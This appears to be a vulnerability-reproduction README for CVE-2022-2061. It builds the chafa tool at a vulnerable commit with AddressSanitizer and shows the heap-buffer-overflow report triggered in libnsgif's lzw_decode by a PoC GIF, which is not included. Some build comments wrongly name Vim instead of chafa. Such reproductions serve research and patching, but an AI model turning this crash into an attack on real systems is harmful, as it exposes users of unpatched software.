### CVE-2022-2061

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/365ab61f-9a63-421c-97e6-21d4653021f0/)

### Docker Container Run Command
```shell
docker build -t cve-2022-2061-poc .
docker run -itd --name CVE-2022-2061-POC cve-2022-2061-poc
docker exec -it CVE-2022-2061-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:hpjansson/chafa.git

# Rollback to the vulnerable version.
cd chafa/
git reset --hard 4bac14668535c09f6f47552bbd1566097dab4bf8

# Install the compilation and installation dependencies for Vim.
apt install gcc make pkg-config libgtk2.0-dev clang g++ libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install Vim.
export CFLAGS="-g -O0 -fsanitize=address"; export CXXFLAGS="-g -O0 -fsanitize=address"; export CC=$(which clang-10); export CXX=$(which clang++-10)
./autogen.sh
./configure --disable-shared
make -j 8
make install

# Open the poc file.
chafa /poc/cc6d16b6c395925244b398c849a02a47625f67dc.gif
```

### Description
Observed that:
```
=================================================================
==14012==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffff99905259 at pc 0xaaaae9da3594 bp 0xffffe817fac0 sp 0xffffe817fad0
READ of size 1 at 0xffff99905259 thread T0
#0 0xaaaae9da3590 in lzw_decode /poc/chafa/libnsgif/lzw.c:362
#1 0xaaaae9d9f0fc in gif_internal_decode_frame /poc/chafa/libnsgif/libnsgif.c:868
#2 0xaaaae9da14f0 in gif_decode_frame /poc/chafa/libnsgif/libnsgif.c:1151
#3 0xaaaae9d1fac0 in maybe_decode_frame /poc/chafa/tools/chafa/gif-loader.c:68
#4 0xaaaae9d2043c in gif_loader_get_frame_data /poc/chafa/tools/chafa/gif-loader.c:204
#5 0xaaaae9d216f4 in media_loader_get_frame_data /poc/chafa/tools/chafa/media-loader.c:282
#6 0xaaaae9d175b4 in run_generic /poc/chafa/tools/chafa/chafa.c:1786
#7 0xaaaae9d18420 in run /poc/chafa/tools/chafa/chafa.c:1923
#8 0xaaaae9d186fc in run_all /poc/chafa/tools/chafa/chafa.c:1983
#9 0xaaaae9d18c40 in main /poc/chafa/tools/chafa/chafa.c:2035
#10 0xffff9fc573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#11 0xffff9fc574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#12 0xaaaae9d0dd6c in _start (/usr/local/bin/chafa+0x3cd6c)

0xffff99905259 is located 9 bytes to the right of 20560-byte region [0xffff99900200,0xffff99905250)
allocated by thread T0 here:
#0 0xffffa023a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xaaaae9da17e8 in lzw_context_create /poc/chafa/libnsgif/lzw.c:91
#2 0xaaaae9d9fbc0 in gif_initialise /poc/chafa/libnsgif/libnsgif.c:946
#3 0xaaaae9d20024 in gif_loader_new_from_mapping /poc/chafa/tools/chafa/gif-loader.c:151
#4 0xaaaae9d20f94 in media_loader_new /poc/chafa/tools/chafa/media-loader.c:213
#5 0xaaaae9d173f8 in run_generic /poc/chafa/tools/chafa/chafa.c:1747
#6 0xaaaae9d18420 in run /poc/chafa/tools/chafa/chafa.c:1923
#7 0xaaaae9d186fc in run_all /poc/chafa/tools/chafa/chafa.c:1983
#8 0xaaaae9d18c40 in main /poc/chafa/tools/chafa/chafa.c:2035
#9 0xffff9fc573f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#10 0xffff9fc574c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#11 0xaaaae9d0dd6c in _start (/usr/local/bin/chafa+0x3cd6c)

SUMMARY: AddressSanitizer: heap-buffer-overflow /poc/chafa/libnsgif/lzw.c:362 in lzw_decode
Shadow bytes around the buggy address:
0x200ff33209f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff3320a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff3320a10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff3320a20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x200ff3320a30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x200ff3320a40: 00 00 00 00 00 00 00 00 00 00 fa[fa]fa fa fa fa
0x200ff3320a50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3320a60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3320a70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3320a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff3320a90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==14012==ABORTING
```


